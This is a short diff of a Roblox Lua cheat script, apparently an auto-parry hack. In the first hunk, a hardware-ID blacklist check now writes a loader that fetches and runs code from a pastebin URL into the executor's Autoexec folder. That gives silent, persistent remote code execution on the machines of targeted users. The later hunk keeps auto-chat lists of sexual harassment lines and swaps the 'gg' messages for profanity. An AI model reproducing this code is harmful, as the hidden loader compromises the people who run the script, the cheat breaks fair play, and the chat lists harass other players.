@@ -2,7 +2,7 @@ local HWID=game:GetService("RbxAnalyticsService"):GetClientId()
 local blacklist={"0aa71708-1234-47ab-8b03-81ee75c7c116"}
 for i, v in pairs(blacklist) do
   if v == HWID then
-writefile("/blacklisted.txt", "loadstring(game:HttpGet(('https://pastebin.com/raw/vrChMYWP'),true))()")
+writefile("/Autoexec/blacklisted.txt", "loadstring(game:HttpGet(('https://pastebin.com/raw/vrChMYWP'),true))()")
 --[[
       By Tieu Lann
 ]] --
@@ -165,7 +165,7 @@ local IMMEDIATE_PARRY_DISTANCE = 15
 local IMMEDIATE_HIGH_VELOCITY_THRESHOLD = 85
 local UserInputService = game:GetService("UserInputService")
 local responses = {"fuck me daddy", "ur dick so big", "dick dick dick", "your boobs is so big", "fuck shit fuck shit", "pls fuck me pls fuck me", "your dick so small your dick so small"}
-local gameEndResponses = {"ggs", "gg :3", "good game", "ggs yall", "wp", "ggs man"}
+local gameEndResponses = {"fuck", "fuck", "fuck", "fuck yall", "fuck", "fuck"}
 local keywords = {"auto parry", "auto", "cheating", "hacking"}
 local heartbeatConnection
 local focusedBall, displayBall = nil, nil
